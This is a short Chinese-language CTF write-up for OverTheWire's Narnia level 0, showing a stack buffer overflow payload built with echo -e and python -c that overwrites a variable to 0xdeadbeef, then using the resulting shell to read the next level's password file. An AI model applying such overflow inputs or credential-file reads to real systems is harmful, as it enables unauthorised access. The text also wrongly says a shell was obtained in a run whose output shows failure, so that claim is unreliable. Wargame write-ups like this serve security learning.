可以使用`python -c`，或者`echo -e`(-e 表示"enable interpretation of backslash escapes")。
> The BASH shell has the ability to represent hex using the \x escape sequence, but in order for echo to parse escape sequence we have to add the -e option. Since hex values outside the ASCII range contain non-printable characters that are not easily copied and pasted, we are going to pipe the output directly to the program. This has the affect of storing our custom string into a buffer and waiting for scanf() to read it.

参考：https://hackmethod.com/overthewire-narnia-0/
```
➜  Narnia git:(master) echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde";pwd |./narnia0           [20:54:09]
AAAAAAAAAAAAAAAAAAAAﾭ�
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: /Users/caiqiqi/ctf/OverT
val: 0x41414141
WAY OFF!!!!
➜  Narnia git:(master) python -c 'print "A"*20+"\xef\xbe\xad\xde"';pwd |./narnia0              [20:54:25]
AAAAAAAAAAAAAAAAAAAAﾭ�
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: /Users/caiqiqi/ctf/OverT
val: 0x41414141
WAY OFF!!!!
```

以上不仅把shellcode作为输入传到了./narnia0, 得到了shell, 而且还加了一句pwd用来验证确实已经得到shell了。然而这样执行完命令之后，shell程序马上就关闭了。得想一个办法让shell一直开着。找了半天终于发现cat命令可以让shell保持开放。

得到shell

```
narnia0@melinda:/narnia$ ls
narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8
narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c  narnia8.c
narnia0@melinda:/narnia$ (python -c 'print "A"*20+"\xef\xbe\xad\xde"';cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
id
uid=14000(narnia0) gid=14000(narnia0) euid=14001(narnia1) groups=14001(narnia1),14000(narnia0)
cat /etc/narnia_pass/narnia1
efeidiedae
```
得到narnia1的密码了
